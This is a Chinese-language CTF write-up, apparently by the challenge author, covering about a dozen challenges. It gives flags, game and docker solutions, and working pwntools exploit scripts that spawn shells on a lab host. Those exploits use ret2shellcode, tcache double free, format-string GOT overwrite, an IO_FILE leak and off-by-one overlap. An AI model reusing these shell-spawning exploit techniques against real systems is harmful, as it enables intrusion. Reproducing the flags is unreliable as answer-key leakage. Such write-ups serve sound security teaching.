# Sign_in
Hand up the flag#ZJGSUCTF{3308589df76600313dce2f6534d5f721}
# differ
利用其信息摘要找出相同的文件脚本如下
```python
import hashlib as m
for i in range(100,1000):
	count1 = str(i)
	#print i
	fw1 = open("{}.txt".format(count1)).read()
	for j in range(100,1000):
		count2 = str(j)
	#print j
		if count1==count2:
			continue
		fw2 = open("{}.txt".format(count2)).read()
		if fw1==fw2:
			print i
			print "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
			break
print "over"
#flag{138339420733999}
```
# PACMAN
游戏题,考验大家对类`unix`的熟悉程度门槛不高只要能跑起来(设置地图文件)打过第一关超过333分就可以获得flag
做了点小手脚防止strings但是依然可以逆向出来只是比玩出来还要麻烦一点
`ZJSU{01eae50bd4b8bae44b}`
# Alphastop
比较简单的游戏题主要考验大家信息搜集的能力(当然学过围棋的就很容易做出来了)
服务走的是简单的模仿棋只要网上搜寻一下模仿棋破解走法就可以获得flag
```python
from pwn import *
def ps(pos=""):
	p.readuntil("Time remain:")
	p.readline()
	p.readline()
	p.sendline(pos)
def fill(c="A"):
	for x in range(1,20):
		ps(c+str(x))
def F(c="A"):
	for x in range(1,20):
		if x not in [8,9,10,11,12]:
			ps(c+str(x))
p=remote("10.21.13.190",2604)


ps("J11")
ps("I11")
ps("I10")
ps("I9")
ps("J8")
ps("K8")
ps("L9")
ps("L10")
ps("L11")
ps("K12")
#
for x in ['R','S','Q','P','O','N','M',]:
	fill(x)

F("K")
F("L")
for x in range(13,20):
	ps("J"+str(x))
ps("L12")
ps("L8")
ps("K9")
context.log_level='debug'
ps("K10")
#gdb.attach(p)
p.interactive()

#ZJGSUCTF{2a07bb17ce725f34}

```
# Blue_Whale
依然是比较简单的工具使用题主要考察对`docker`的使用和理解.
题目中还有些社会工程学.
做法其实很简单:`https://cloud.docker.com/repository/list`上搜索`n132`就会出现`n132/blue_whale`的仓库
进入后发现有个tag为`blue_whale`的`image pull`下来后`find / -name fl4g`就可以获得`flag`:
```s
root@48b324da3eca:/# find / -name fl4g
/lib/x86_64-linux-gnu/fl4g
root@48b324da3eca:/# cat /lib/x86_64-linux-gnu/fl4g
ZJGSUCTF{0fbaed8d210a7a0480220a5c803d8435}
root@48b324da3eca:/# ZJGSUCTF{0fbaed8d210a7a0480220a5c803d8435}
```
# Mos
地址泄露只是为了误导大家.
checksec
```s
[*] '/home/n132/Desktop/MY_TIM/Mos/main'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments

```
发现没开`NX`没开`pie`存在栈溢出所以直接`ret2shellcode(bss)`
```python
from pwn import *
context.arch='amd64'
#context.log_level='debug'
#p=process("./main")
p=remote("10.21.13.190",2600)
read=0x000000000400440
rdi=0x0000000000400613
rsi=0x0000000000400611
bss=0x00601000+0x200
p.sendline("A"*0x10+p64(0)+p64(rdi)+p64(0)+p64(rsi)+p64(bss)+p64(0)+p64(read)+p64(bss))
sleep(1)
shellcode='''
xor rax,rax
mov al,0x3b
xor rdx,rdx
xor rsi,rsi
mov rdi,0x68732f6e69622f
push rdi
mov rdi,rsp
syscall
'''
p.sendline(asm(shellcode))
p.interactive()
```
# Note
简单的`double_free`放在2.27下
主要考察了解tcache.tcache更加方便控制.
```python
from pwn import *
def cmd(c):
	p.sendlineafter("=\n\n",str(c))
def add(data):
	cmd(1)
	p.sendafter(">\n",data)
def free(idx):
	cmd(2)
	p.sendlineafter(">",str(idx))
def show(idx):
	cmd(3)
	p.sendlineafter(">",str(idx))
#context.log_level='debug'
#p=process("./main")
p=remote("10.21.13.190",2599)
add("A")
add("B")
for x in range(7):
	free(1)
free(0)
show(0)
base=u64(p.readuntil("=")[:-1])-(0xa0a7ffff7dcfca0-0x00007ffff79e4000)
libc=ELF("./libc-2.27.so")
libc.address=base
log.warning(hex(base))

add(p64(libc.symbols['__free_hook']-8))#2
add("/bin/sh")
#raw_input()
one=libc.symbols['system']
add(p64(one)*2)

free(3)

#gdb.attach(p)
p.interactive()
#ZJGSUCTF{acb4de115f0b3ac563e63383591206ca}
```
# Time
脱去外衣之后就是简单的fmtstr比较短的做法是跳`one_gadget`（1/16）
```python
from pwn import *
#context.log_level='debug'
got=0x000000000601028
#p=process("./main")
p=remote("10.21.13.190",2699)
#gdb.attach(p)
payload="%{}c%8$hn".format(0x2216).ljust(0x10,'\x00')+p64(got)
payload=payload[:-5]
log.info((payload))
log.info(len(payload))
p.sendafter(".\n",payload)
p.interactive()
```


# Crash

题目比较简单主要依靠`partialwrite`
和`IO_leak`
```python
from pwn import *
def cmd(c):
	p.sendlineafter(">\n",str(c))
def CMD(c):
	p.sendlineafter(">",str(c))
def add(c="A"):
	cmd(1)
	p.sendafter("ote>\n",c)
def ADD(c="A"):
	CMD(1)
	p.sendafter("ote>",c)
def EDIT(idx,lenth,c):
	CMD(3)
	p.sendlineafter("?\n",str(idx))
	p.sendlineafter(">",str(lenth))
	p.sendafter(">",c)
def FREE(idx):
	CMD(2)
	p.sendlineafter("?\n",str(idx))
def edit(idx,lenth,c):
	cmd(3)
	p.sendlineafter(">",str(idx))
	p.sendlineafter(">",str(lenth))
	p.sendafter(">\n",c)
def free(idx):
	cmd(2)
	p.sendlineafter(">",str(idx))
#p=process("./main",env={"LD_PRELOAD":"./libc-2.27.so"})
p=remote("10.21.13.190",2602)
#context.log_level='debug'
for x in range(8):
	add("A")
add("END")
for x in range(5):
	free(4-x)
free(6)
free(5)
free(7)
add()#0
edit(0,0x200,'\x00'*0x138+p64(0x141)+'\x20\x7b')
add()#1
edit(1,0x200,'\x00'*0x138+p64(0x141)+'\x60\x07\xdd')
add()
add(p64(0xfbad1800)+p64(0)*3+'\x00')
try:
	base=u64(p.read(16)[8:])-(0x7ffff7dd18b0-0x7ffff79e4000)
	if base%0x1000!=0:
		p.close()
	log.warning(hex(base))
	FREE(1)
	FREE(0)
	ADD()
	libc=ELF("./libc-2.27.so")
	libc.address=base
	EDIT(0,0x200,"/bin/sh".ljust(0x138,'\x00')+p64(0x141)+p64(libc.symbols['__free_hook']))
	ADD()
	ADD(p64(libc.symbols['system']))
	FREE(0)
	context.log_level='debug'
	p.sendline("cat flag")
	#gdb.attach(p)
	p.interactive()
except Exception:
	p.close()
#ZJGSUCTF{dbe44696821a72af0cad8e7512625f45}
```

# Three-body
简单的`off-by-one`获得`overlap`后改写`__malloc_hook`
三个`chunk`的限制其实没有多大作用
```python
from pwn import *
def cmd(c):
	p.sendlineafter(">\n",str(c))
def add(size,c="A"):
	cmd(1)
	cmd(size)
	p.sendafter(">\n",c)
def free(idx):
	cmd(2)
	p.sendlineafter(">",str(idx))
def show(idx):
	cmd(3)
	p.sendlineafter(">",str(idx))
def edit(idx,c):
	cmd(4)
	p.sendlineafter(">",str(idx))
	p.sendafter(">",c)
#p=process("./main")
p=remote("10.21.13.190",2603)
add(0x88)#0
add(0x18,"A"*0x18)#1
free(0)
add(0x88)#0
add(0x68,p64(0x21)*13)#2
show(0)
base=u64(p.readline()[:-1].ljust(8,'\x00'))-(0x7ffff7dd1b41-0x7ffff7a0d000)
log.warning(hex(base))
free(0)
add(0x88,"A"*0x88)#0
edit(0,"A"*0x88+'\x41')
free(1)
free(2)
libc=ELF("./libc-2.23.so")
libc.address=base
add(0x38,p64(0)*3+p64(0x71)+p64(libc.symbols['__malloc_hook']-35))#1
add(0x68)#2
free(0)
free(1)
one=base+0xf02a4
add(0x38,"\x00"*0x28)#0
add(0x68,'\x00'*19+p64(one))#1
free(2)
#gdb.attach(p)
p.interactive()
#ZJGSUCTF{16d5854ae35c082383bc2849abe7a779}
```

# POCPOC
这是关于宝可梦的题目所以首先要理解gba文件,ROM.
关于宝可梦其中主要的内容有地图和事件,可以上网找地图事件编辑器例如`AdvanceMap 1.92`，`PokemonRomViewer1.5`..
打开后发现我新加了一张地图flag就在地图内.
进入地图的条件是打败四大天王最后一个.所以金手指调出n个100级再直接传送过去打也可以.

预期做法应该是:通过地图事件查看编辑器发现地图
当然也可以直接金手指调出梦幻阵容完成剧情(或者下载已经通关的存档)(本来没让最后一个天王连接着flag的地图的 但是怕有人玩了两天...)

